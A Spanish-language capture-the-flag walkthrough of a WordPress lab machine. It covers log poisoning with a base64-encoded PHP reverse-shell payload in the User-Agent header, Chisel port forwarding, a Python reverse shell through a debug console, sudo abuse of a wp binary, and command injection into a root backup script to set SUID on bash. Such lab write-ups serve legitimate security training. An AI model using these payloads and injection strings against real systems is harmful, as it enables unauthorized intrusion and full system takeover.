## Reconocimiento:

Puerto 80 : HTTP

En el escaneo encuentro un dominio:

```bash
http://bicho.dl
```

En la web se ve que esta hecha con WordPress, así que le hago un escaneo tradicional:

```bash
wpscan --url http://bicho.dl/ --enumerate u
```

Encuentro el usuario bicho, pero aplicando fuerza bruta no consigo nada.

Así que paso a hacer fuzzing a la web:

```bash
gobuster dir -u http://bicho.dl/wp-content/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x html,php,txt,log -t 50 -k -r
```

Interesa debug.log

Podemos ver logs así que toca probar un Log Poisoning

El archivo utiliza de referencia el user-agent, así que voy a interceptar la petición con Burpsuite del panel de login y en la sección de user-agent inyectare un código malicioso php.

Primero encripto la rev shell:

```bash
echo "bash -i >& /dev/tcp/172.17.0.1/4444 0>&1" | base64
# Info:
YmFzaCAtaSA+JiAvZGV2L3RjcC8xNzIuMTcuMC4xLzQ0NDQgMD4mMQo=
```

Con eso modifico la petición:

```bash
POST /wp-login.php HTTP/1.1
Host: bicho.dl
User-Agent: <?php echo `printf YmFzaCAtaSA+JiAvZGV2L3RjcC8xNzIuMTcuMC4xLzQ0NDQgMD4mMQo= | base64 -d | bash`; ?>
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
---
```

La envío y me pongo a la escucha:

```bash
nc -lnvp 4444
```

Y en el navegador busco:

```bash
http://bicho.dl/wp-content/debug.log
```

Y recibo una conexión.

## Escalada www-data → app

No encuentro nada, así que veo los puertos:

```bash
netstat -tuln
```

Interesa:

```bash
tcp        0      0 127.0.0.1:5000          0.0.0.0:*               LISTEN      off (0.00/0/0)
```

Voy a utilizar Chisel para un Port Forwarding.

Primero desde el host lo paso a la máquina victima:

```bash
# Desde el host:
cp /usr/bin/chisel .
python3 -m http.server 

# Desde la víctima:
cd /tmp
wget http://172.17.0.1/chisel
```

Luego lo ejecuto desde el host:

```bash
./chisel server --port 5555 --reverse
```

Para ejecutarlo como cliente en la máquina victima:

```bash
./chisel client 172.17.0.1:5555 R:5000:127.0.0.1:5000
```

Listo, ahora puedo ver el contenido en el navegador:

```bash
http://127.0.0.1:5000
```

Se ve un blog de writeups de máquinas, no encuentro nada interesante así que le hago fuzzing:

```bash
gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://localhost:5000 -t 200
```

Encuentro /console.

Es una consola interactiva, la idea es mandarnos una rev shell. En este caso utilizo Python:

```bash
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("172.17.0.1",4445));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")
```

Me pongo a la escucha:

```bash
nc -lnvp 4445
```

Recibo una conexión con el usuario app.

## Escalada app → wpuser

```bash
sudo -l
(wpuser) NOPASSWD: /usr/local/bin/wp
```

El binario se encarga de desplegar WordPress que al ejecutarlo podemos pasarle el parámetro `--exec` y una instrucción en PHP que ejecutará al iniciar.

Así que le paso una conexión reversa y me pongo a la escucha:

```bash
nc -lnvp 4446
```

```bash
sudo -u wpuser /usr/local/bin/wp --exec="system('bash -c \"bash -i >& /dev/tcp/172.17.0.1/4446 0>&1\"');"
```

## Escalada wpuser → root

```bash
sudo -l 
(root) NOPASSWD: /opt/scripts/backup.sh
```

Analizando el script se puede ver que es vulnerable gracias a la concatenación de comandos, así que primero pruebo a ver si funciona:

```bash
sudo /opt/scripts/backup.sh "test; whoami;"
```

Devuelve root, confirmando la vulnerabilidad.

Le daré permisos SUID a la bash:

```bash
sudo /opt/scripts/backup.sh "test; chmod u+s /bin/bash"
```

Funcionó

```bash
bash -p
```

Listo.
